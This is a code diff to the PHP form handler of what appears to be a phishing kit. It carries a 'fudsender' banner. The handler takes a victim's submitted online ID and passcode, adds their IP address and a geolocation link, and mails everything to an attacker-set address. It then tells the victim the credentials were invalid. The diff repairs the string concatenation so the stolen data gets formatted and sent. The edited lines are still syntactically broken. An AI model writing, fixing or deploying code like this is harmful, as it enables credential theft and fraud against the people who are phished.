@@ -9,8 +9,8 @@ if($email != null && $password != null){
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
 	$message .= "|----------| xLs |--------------|\n";
 	
-	$message .= "Online ID            : "$email";
-	$message .= "Passcode              : "<br>$password";
+	$message .= "Online ID            : ".$email.";
+	$message .= "Passcode              : ".$password.";
 	$message .= "|--------------- I N F O | I P -------------------|\n";
 	$message .= "|Client IP: ".$ip."\n";
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
@@ -18,7 +18,7 @@ if($email != null && $password != null){
 	$message .= "|----------- fudsender(dot)com --------------|\n";
 	$send = $Receive_email;
 	$subject = "Login : $ip";
-        $retval = mail($send,$subject,$message);   
+        mail($send,$subject,$message);   
 	$signal = 'ok';
 	$msg = 'InValid Credentials';
 	
